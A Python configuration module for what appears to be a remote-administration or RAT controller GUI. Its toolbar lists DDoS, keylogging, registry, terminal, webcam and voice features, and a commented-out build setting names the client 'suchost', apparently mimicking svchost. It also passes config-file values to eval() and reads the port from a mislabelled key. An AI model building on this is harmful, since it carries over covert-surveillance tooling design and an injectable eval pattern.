# -*- coding: utf-8 -*-
from os.path import abspath, join, exists
from os import mkdir

from lib.basePath import BASE_PATH
from lib import config_file_to_py, config_init, configer
from lib import qtResource  # 资源文件
from lib import fix_qt_import_error  # Qt打包补丁

# 系统图标
MAIN_UI = {
    "app": ':/ui/images/mainUi/app.png',
    "background": ':/ui/images/mainUi/background.png',
    # "confirm": ':/ui/images/mainUi/confirm.png',
    "loading": ':/ui/images/mainUi/loading.png',
}

# 菜单图标
MENUBAR_UI = {
    "about": ':/ui/images/menubar/about.png',
    "exit": ':/ui/images/menubar/exit.png',
    "view": ':/ui/images/menubar/view.png',
    "options": ':/ui/images/menubar/options.png',
    "make_server": ':/ui/images/menubar/make_server.png',
    "setting": ':/ui/images/menubar/setting.png',
    "skin": ':/ui/images/menubar/skin.png',
}

# 工具导航栏
TOOLBAR_UI = {
    "ddos": ':/ui/images/toolbar/ddos.png',
    "desktop": ':/ui/images/toolbar/desktop.png',
    "file": ':/ui/images/toolbar/file.png',
    "filter": ':/ui/images/toolbar/filter.png',
    "host": ':/ui/images/toolbar/host.png',
    "keyboard": ':/ui/images/toolbar/keyboard.png',
    "registry": ':/ui/images/toolbar/registry.png',
    "server": ':/ui/images/toolbar/server.png',
    "start": ':/ui/images/toolbar/start.png',
    "stop": ':/ui/images/toolbar/stop.png',
    "terminal": ':/ui/images/toolbar/terminal.png',
    "video": ':/ui/images/toolbar/video.png',
    "voice": ':/ui/images/toolbar/voice.png',
}

# 设置
# options = {
#     "release_dir": abspath(join(os.path.dirname(BASE_PATH), "release")),  # 编译文件目录
#     # {{client打包配置
#     "client_icon": abspath(join(BASE_PATH, "src/images/app.ico")),  # 程序图标
#     "client_dir": abspath(join(os.path.dirname(BASE_PATH), "release/client")),  # 客户端存放目录
#     "client_make": abspath(join(BASE_PATH, "core/logicalCode/client/client.py")),  # 客户端文件
#     "client_temp": abspath(join(os.path.dirname(BASE_PATH), "release/client/temp")),  # 临时文件夹
#     "client_dist_path": abspath(join(os.path.dirname(BASE_PATH), "release/client")),  # 编译存放位置
#     "client_name": "suchost",
#     # }}
# 
#     # {{server打包配置
#     "server_icon": abspath(join(BASE_PATH, "src/images/app.ico")),  # 程序图标
#     "server_dir": abspath(join(os.path.dirname(BASE_PATH), "release/server")),  # 服务端存放目录
#     "server_make": abspath(join(os.path.dirname(BASE_PATH), "server/run.py")),  # 服务端文件
#     "server_temp": abspath(join(os.path.dirname(BASE_PATH), "release/server/temp")),  # 临时文件夹
#     "server_dist_path": abspath(join(os.path.dirname(BASE_PATH), "release/server")),  # 编译存放位置
#     "server_name": "远程控制",
#     # }}
# }

# 系统配置
CONF_DIR = abspath(join(BASE_PATH, "conf"))  # 配置文件夹
mkdir(CONF_DIR) if not exists(CONF_DIR) else None  # 初始化配置文件夹
CONFIG_FILE = abspath(join(BASE_PATH, "conf", "config.ini"))  # 外部配置文件

# 资源配置
SRC_DIR = abspath(join(BASE_PATH, "src"))  # 资源文件夹
mkdir(SRC_DIR) if not exists(SRC_DIR) else None  # 初始化资源文件夹
DATA_DB = abspath(join(BASE_PATH, "src", "data.db"))  # IP数据库

# 读取外部配置文件
if not exists(CONFIG_FILE):
    # 外置配置文件不存在,生成配置文件
    config_file_to_py.py_to_file(CONFIG_FILE, config_init.CONFIG_DATA)
CONFIG_OBJ = configer.ReadConfig(CONFIG_FILE)
CONFIG = CONFIG_OBJ.read_to_dict()
# 语音配置
SOUND_DIR = abspath(join(BASE_PATH, "src", "sound"))  # 音频资源文件夹
mkdir(SOUND_DIR) if not exists(SOUND_DIR) else None  # 初始化音频资源文件夹
SOUND_OFFLINE = abspath(join(BASE_PATH, "src", "sound", "offline.wav"))  # 下线
SOUND_ONLINE = abspath(join(BASE_PATH, "src", "sound", "online.wav"))  # 上线
SOUND_SETTING = abspath(join(BASE_PATH, "src", "sound", "setting.wav"))  # 自动上线设置
SOUND_ON = eval(CONFIG["audio"].get("sound_on", "1"))  # 声音是否开启;0：关闭; 1：开启

# 日志配置
LOGGING_DIR = abspath(join(BASE_PATH, "logs"))  # 日志文件夹
mkdir(LOGGING_DIR) if not exists(LOGGING_DIR) else None  # 初始化日志文件夹
LOGGING_LEVEL = CONFIG["logging"].get("logging_level", "INFO")  # 日志打印级别; DEBUG/INFO/WARNING/ERROR/CRITICAL

# =========================== 系统控制 ===========================
# 调试模式
DEBUG = True

# 进程数
PROCESSES = eval(CONFIG["system"].get("processes", "4"))

# =========================== 特效控制 ===========================
# 开启加载特效是否打开
# ;0：关闭 1：开启
LOAD_EFFECT_ON = eval(CONFIG["effect"].get("load_effect_on", "1"))

# 界面组件加载延迟
if DEBUG:
    LOAD_DELAY = 0
else:
    LOAD_DELAY = 0.3

# 透明度
# ;0.0-1.0
TRANSPARENT = eval(CONFIG["effect"].get("transparent", "0.8"))

# 皮肤初始化
# SKIN_COLOR = ()
SKIN_COLOR = eval(CONFIG["effect"].get("skin_color", "(107, 173, 246)"))

# =========================== 模块显示 ===========================
# 工具箱扩展是否显示
# ;0： 隐藏  1： 显示
TOOLS_EXTENSION_SHOW = eval(CONFIG["view"].get("tools_extension_show", "1"))

# 工具栏是否显示
# ;0： 隐藏  1： 显示
TOOLBAR_SHOW = eval(CONFIG["view"].get("toolbar_show", "1"))

# 状态栏是否显示
# ;0： 隐藏  1： 显示
STATUSBAR_SHOW = eval(CONFIG["view"].get("statusbar_show", "1"))

# 分组信息是否显示
# ;0： 隐藏  1： 显示
GROUP_TREE_SHOW = eval(CONFIG["view"].get("group_tree_show", "1"))

# =========================== 监听配置 ===========================
# 监听地址
IP = CONFIG["address"].get("ip", "")
# 监听端口
PORT = eval(CONFIG["address"].get("statusbar_show", "2020"))


def update_conf() -> dict:
    """
    更新配置字典
    :return: dict
    """
    # =========================== 日志配置 ===========================
    CONFIG["logging"]["logging_level"] = LOGGING_LEVEL
    # =========================== 监听配置 ===========================
    CONFIG["address"]["ip"] = IP
    CONFIG["address"]["statusbar_show"] = PORT
    # =========================== 系统控制 ===========================
    CONFIG["system"]["processes"] = PROCESSES
    # =========================== 特效控制 ===========================
    CONFIG["effect"]["load_effect_on"] = LOAD_EFFECT_ON
    CONFIG["effect"]["transparent"] = TRANSPARENT
    CONFIG["effect"]["skin_color"] = SKIN_COLOR
    # =========================== 声音控制 ===========================
    CONFIG["audio"]["sound_on"] = SOUND_ON
    # =========================== 模块显示 ===========================
    CONFIG["view"]["tools_extension_show"] = TOOLS_EXTENSION_SHOW
    CONFIG["view"]["toolbar_show"] = TOOLBAR_SHOW
    CONFIG["view"]["statusbar_show"] = STATUSBAR_SHOW
    CONFIG["view"]["group_tree_show"] = GROUP_TREE_SHOW
    return CONFIG


def update_conf_file() -> None:
    CONFIG_OBJ.save_dict(CONFIG)
